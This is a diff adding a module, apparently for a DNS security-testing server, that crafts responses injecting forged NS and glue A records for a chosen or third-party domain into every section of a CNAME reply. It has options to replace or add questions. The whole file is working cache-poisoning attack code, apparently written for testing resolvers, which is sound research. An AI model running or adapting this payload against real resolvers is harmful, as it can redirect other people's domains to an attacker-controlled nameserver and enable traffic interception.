@@ -1,0 +1,66 @@
+[module]
+name = "inj13"
+info = "Injection 13 - CNAME with injected NS records in all sections"
+desc = "Respond with a CNAME (inj13poc.whatever.com), but include information in all sections that NS for whatever.com is ns1.yourdomain.com and also provide our IP for the ns1.yourdomain.com."
+type = "feature"
+author = "ivan.jedek@oryxlabs.com"
+
+code = '''
+if req.first_subdomain.startswith("inj13"):
+   # Send CNAME answer, and send a NS record + IP of the NS in all sections
+   injns = "ns1." + req.sld_tld_domain
+   injdom = a3rdparty_domain
+   cnamedom = "injected13." + a3rdparty_domain
+   addedquestions = b''
+   if "3rdparty" in req.subdomains:  # inject a 3rd party domain
+      injns   = "ns1." + a3rdparty_domain
+   injnsip = ZONEFILE[injns.lower()]["A"]
+   if "replq" in req.subdomains:  # replace the question with our injected stuffs
+      orig_req_domain = req.full_domain
+      req.full_domain = injdom
+      addcustomlog("REPLQ")
+   if "addq" in req.subdomains:  # add additional question for our injected stuffs
+      resp.QURR = req.QURR+1
+      addedquestions  = convDom2Bin(injdom) + req.type_bin + req.class_bin
+      addcustomlog("ADDQ")
+   ### DNS header ########
+   buffer = prep_dns_header(b'\x84\x00', resp.QURR, 3, 2, 2)
+   ### QUESTION SECTION ########
+   if resp.noq: buffer += convDom2Bin(req.full_domain) + req.type_bin + req.class_bin
+   buffer += addedquestions
+   ### ANSWER SECTION ########
+   buffer += convDom2Bin(req.full_domain) + getTypeBin("CNAME") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)         ## TTL
+   buffer += struct.pack(">H", len(cnamedom)+2)  ## Data length
+   buffer += convDom2Bin(cnamedom)               ## CNAME
+   buffer += convDom2Bin(injdom) + getTypeBin("NS") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)         ## TTL
+   buffer += struct.pack(">H", len(injns)+2)     ## Data length
+   buffer += convDom2Bin(injns)                  ## NS hostname
+   buffer += convDom2Bin(injns) + getTypeBin("A") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)         ## TTL
+   buffer += struct.pack(">H", 4)                ## Data length
+   buffer += socket.inet_aton(injnsip)           ## IP
+   ### AUTHORITY SECTION ########
+   buffer += convDom2Bin(injdom) + getTypeBin("NS") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)         ## TTL
+   buffer += struct.pack(">H", len(injns)+2)     ## Data length
+   buffer += convDom2Bin(injns)                  ## NS hostname
+   buffer += convDom2Bin(injns) + getTypeBin("A") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)         ## TTL
+   buffer += struct.pack(">H", 4)                ## Data length
+   buffer += socket.inet_aton(injnsip)           ## IP
+   ### ADDITIONAL SECTION ########
+   buffer += convDom2Bin(injdom) + getTypeBin("NS") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)         ## TTL
+   buffer += struct.pack(">H", len(injns)+2)     ## Data length
+   buffer += convDom2Bin(injns)                  ## NS hostname
+   buffer += convDom2Bin(injns) + getTypeBin("A") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)         ## TTL
+   buffer += struct.pack(">H", 4)                ## Data length
+   buffer += socket.inet_aton(injnsip)           ## IP
+   # log and send
+   log("CNAME %s + %s NS -> %s -> %s in all sections" % (cnamedom, injdom, injns, injnsip))
+   send_buf(self, buffer)
+   #####################################################################
+'''
